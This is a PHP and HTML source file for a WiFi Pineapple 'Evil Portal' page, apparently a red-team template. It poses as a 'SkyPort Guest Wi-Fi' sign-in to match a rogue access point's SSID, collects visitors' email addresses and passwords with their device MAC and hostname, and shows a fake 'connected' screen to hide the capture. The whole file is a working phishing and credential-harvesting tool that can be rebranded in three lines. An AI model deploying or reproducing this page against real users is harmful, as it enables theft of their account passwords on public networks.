<?php
/* ============================================================================
   SkyPort Guest Wi-Fi — Evil Portal landing page (WiFi Pineapple MK7)
   ----------------------------------------------------------------------------
   Rebrand for your engagement in three lines:
     $BRAND  — brand/provider name shown in the header and footer
     $SSID   — network name displayed on the card (match what PineAP broadcasts)
     $ACCENT — hex color for the button, focus rings, and links
   Everything is self-contained: no external fonts, images, or CDNs, because
   clients have no internet access until after they authenticate.
   ============================================================================ */
$BRAND  = 'SkyPort';
$SSID   = 'Guest_WiFi';
$ACCENT = '#0b6efd';

include_once './helper.php';

// Captive portal pages must never be served from cache.
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

function findParameter($url, $name, $value = '') {
    $value = urlencode($value);
    return stripos($url, "?{$name}={$value}") !== false
        || stripos($url, "&{$name}={$value}") !== false;
}

function addParameter($url, $name, $value = '') {
    $value = urlencode($value);
    return $url . (stripos($url, '?') !== false ? '&' : '?') . "{$name}={$value}";
}

// After the form POST, the backend authorizes the client and redirects back
// here with ?status=success so we can show the "connected" state.
function getRedirectURL() {
    $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http')
         . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (!findParameter($url, 'status')) {
        $url = addParameter($url, 'status', 'success');
    }
    return $url;
}

$inputValues = array(
    'mac'    => getClientMac($_SERVER['REMOTE_ADDR']),
    'host'   => getClientHostName($_SERVER['REMOTE_ADDR']),
    'ssid'   => getClientSSID($_SERVER['REMOTE_ADDR']),
    'target' => getRedirectURL(),
);

$success = findParameter($_SERVER['REQUEST_URI'], 'status', 'success');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title><?= htmlspecialchars($SSID) ?> — Sign In</title>
<?php if ($success): ?>
<meta http-equiv="refresh" content="3;url=https://www.google.com">
<?php endif; ?>
<style>
  :root { --accent: <?= htmlspecialchars($ACCENT) ?>; }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(160deg, #0f2027 0%, #203a43 55%, #2c5364 100%);
    display: flex; align-items: center; justify-content: center;
    padding: 20px; color: #1a1a2e;
    -webkit-font-smoothing: antialiased;
  }
  .card {
    background: #ffffff; width: 100%; max-width: 380px;
    border-radius: 16px; padding: 32px 28px 24px;
    box-shadow: 0 24px 60px rgba(0,0,0,.45);
  }
  .brand { text-align: center; margin-bottom: 22px; }
  .brand .mark {
    width: 56px; height: 56px; margin: 0 auto 12px; border-radius: 50%;
    background: var(--accent); display: flex; align-items: center; justify-content: center;
  }
  .brand h1 { font-size: 22px; font-weight: 700; letter-spacing: .2px; }
  .brand p { font-size: 13px; color: #6b7280; margin-top: 4px; }
  .ssid-pill {
    display: inline-flex; align-items: center; gap: 6px;
    background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 999px;
    padding: 5px 12px; font-size: 12px; color: #475569; margin-top: 10px;
  }
  .ssid-pill .dot { width: 7px; height: 7px; border-radius: 50%; background: #22c55e; }

  label.field-label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin: 14px 0 6px; }
  .input-wrap { position: relative; }
  input[type="email"], input[type="password"], input[type="text"] {
    width: 100%; padding: 12px 14px; font-size: 15px;
    border: 1.5px solid #d1d5db; border-radius: 10px; outline: none;
    transition: border-color .15s, box-shadow .15s; background: #fff;
  }
  input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(11,110,253,.15); }
  .eye {
    position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
    border: 0; background: none; cursor: pointer; padding: 6px; color: #9ca3af;
  }
  .eye:hover { color: #4b5563; }

  .terms { display: flex; gap: 8px; align-items: flex-start; margin-top: 16px; font-size: 12.5px; color: #4b5563; }
  .terms input { margin-top: 2px; accent-color: var(--accent); }
  .terms a { color: var(--accent); text-decoration: none; }
  details.terms-text { margin-top: 8px; font-size: 11.5px; color: #6b7280; line-height: 1.5; }
  details.terms-text summary { cursor: pointer; color: var(--accent); }

  button.submit {
    width: 100%; margin-top: 20px; padding: 13px; font-size: 15px; font-weight: 600;
    color: #fff; background: var(--accent); border: 0; border-radius: 10px;
    cursor: pointer; transition: filter .15s, transform .05s;
  }
  button.submit:hover { filter: brightness(1.08); }
  button.submit:active { transform: scale(.985); }
  button.submit[disabled] { opacity: .75; cursor: default; }
  .spinner {
    display: inline-block; width: 15px; height: 15px; vertical-align: -2px; margin-right: 8px;
    border: 2px solid rgba(255,255,255,.4); border-top-color: #fff; border-radius: 50%;
    animation: spin .7s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes shake {
    10%, 90% { transform: translateX(-1px); } 20%, 80% { transform: translateX(2px); }
    30%, 50%, 70% { transform: translateX(-3px); } 40%, 60% { transform: translateX(3px); }
  }
  .shake { animation: shake .45s; }

  footer { text-align: center; margin-top: 20px; font-size: 11.5px; color: #9ca3af; line-height: 1.6; }
  footer .powered { color: #c4c9d1; }

  /* Success state */
  .success { text-align: center; padding: 12px 0 4px; }
  .check {
    width: 64px; height: 64px; margin: 0 auto 16px; border-radius: 50%;
    background: #22c55e; display: flex; align-items: center; justify-content: center;
    animation: pop .35s ease-out;
  }
  @keyframes pop { 0% { transform: scale(.4); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
  .success h2 { font-size: 19px; margin-bottom: 6px; }
  .success p { font-size: 13.5px; color: #6b7280; }
</style>
</head>
<body>
  <div class="card" id="card">
<?php if ($success): ?>
    <div class="success">
      <div class="check">
        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <h2>You're connected</h2>
      <p>Enjoy the network. Taking you online&hellip;</p>
    </div>
<?php else: ?>
    <div class="brand">
      <div class="mark">
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round">
          <path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
          <circle cx="12" cy="19.5" r="1" fill="#fff"/>
        </svg>
      </div>
      <h1><?= htmlspecialchars($BRAND) ?> Guest Wi-Fi</h1>
      <p>Sign in to get online</p>
      <div class="ssid-pill"><span class="dot"></span><?= htmlspecialchars($SSID) ?></div>
    </div>

    <!-- The module only routes POSTs carrying these hidden fields + the
         credential fields to MyPortal.php. Do not rename them. -->
    <form method="POST" action="/captiveportal/index.php" id="login-form" novalidate>
      <label class="field-label" for="email">Email address</label>
      <div class="input-wrap">
        <input name="email" id="email" type="email" inputmode="email" autocomplete="email"
               spellcheck="false" placeholder="you@example.com" required>
      </div>

      <label class="field-label" for="password">Password</label>
      <div class="input-wrap">
        <input name="password" id="password" type="password" autocomplete="current-password"
               placeholder="Any password for this network" required>
        <button type="button" class="eye" id="toggle-pw" aria-label="Show password">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>

      <div class="terms">
        <input type="checkbox" id="agree" checked>
        <span>I agree to the <a href="#" onclick="document.getElementById('tt').open=!document.getElementById('tt').open;return false;">Terms of Service</a> and Acceptable Use Policy.</span>
      </div>
      <details class="terms-text" id="tt">
        <summary>View terms</summary>
        <p>Complimentary wireless access is provided as-is for guests. Activity may be logged for
        security and abuse-prevention purposes. Do not use this network for unlawful activity.
        Access may be revoked at any time without notice.</p>
      </details>

      <input name="mac"    type="hidden" value="<?= htmlspecialchars($inputValues['mac']) ?>">
      <input name="host"   type="hidden" value="<?= htmlspecialchars($inputValues['host']) ?>">
      <input name="ssid"   type="hidden" value="<?= htmlspecialchars($inputValues['ssid']) ?>">
      <input name="target" type="hidden" value="<?= htmlspecialchars($inputValues['target']) ?>">

      <button type="submit" class="submit" id="submit-btn">Connect</button>
    </form>

    <footer>
      Need help? Contact the front desk &middot; ext. 4120<br>
      <span class="powered">Powered by <?= htmlspecialchars($BRAND) ?> &middot; v4.2.1</span>
    </footer>
<?php endif; ?>
  </div>

<script>
(function () {
  var form  = document.getElementById('login-form');
  if (!form) return;
  var btn   = document.getElementById('submit-btn');
  var pw    = document.getElementById('password');
  var eye   = document.getElementById('toggle-pw');
  var card  = document.getElementById('card');

  eye.addEventListener('click', function () {
    pw.type = pw.type === 'password' ? 'text' : 'password';
  });

  form.addEventListener('submit', function (e) {
    var email = document.getElementById('email');
    if (!email.value || email.value.indexOf('@') < 1 || !pw.value) {
      e.preventDefault();
      card.classList.remove('shake');
      void card.offsetWidth;           // restart the animation
      card.classList.add('shake');
      return;
    }
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span>Connecting&hellip;';
  });
})();
</script>
</body>
</html>
